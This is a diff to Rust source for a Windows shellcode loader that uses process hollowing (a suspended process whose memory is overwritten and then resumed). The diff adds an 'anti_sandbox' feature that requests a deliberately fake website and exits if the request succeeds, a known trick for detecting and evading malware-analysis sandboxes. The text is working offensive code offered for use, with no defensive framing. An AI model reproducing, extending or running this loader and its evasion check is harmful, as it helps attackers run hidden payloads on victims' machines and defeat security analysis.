@@ -2,6 +2,7 @@ extern crate windows;
 use std::{mem, ptr};
 use std::ffi::{CString, c_void};
 use windows::Win32::Foundation::PSTR;
+use windows::Win32::Networking::WinInet::{InternetOpenA, InternetOpenUrlA};
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA};
 
@@ -11,6 +12,22 @@ const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
 pub fn hollow_and_run(shellcode: &[u8]) {
+
+    if cfg!(windows) && cfg!(feature = "anti_sandbox")  {
+        let mut lpsz_agent: PSTR = unsafe { mem::zeroed() };
+        lpsz_agent.0 = CString::new("Name in user-agent").unwrap().into_raw() as *mut u8;
+        let lpsz_proxy: PSTR = unsafe { mem::zeroed() };
+        let lpsz_proxy_bypass: PSTR = unsafe { mem::zeroed() };
+        let internet_handle = unsafe { InternetOpenA(lpsz_agent, 0, lpsz_proxy, lpsz_proxy_bypass, 0) };
+        let mut lpsz_url: PSTR = unsafe { mem::zeroed() };
+        lpsz_url.0 = CString::new("https://www.thisisafakewebsiteorelsetheantisanboxcheckwillfail4sure.com").unwrap().into_raw() as *mut u8;
+        let lpsz_headers: PSTR = unsafe { mem::zeroed() };
+        let website = unsafe { InternetOpenUrlA(internet_handle, lpsz_url, lpsz_headers, 0, 0, 0) };
+        if website != 0 as _ {
+            return
+        }
+    }
+
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
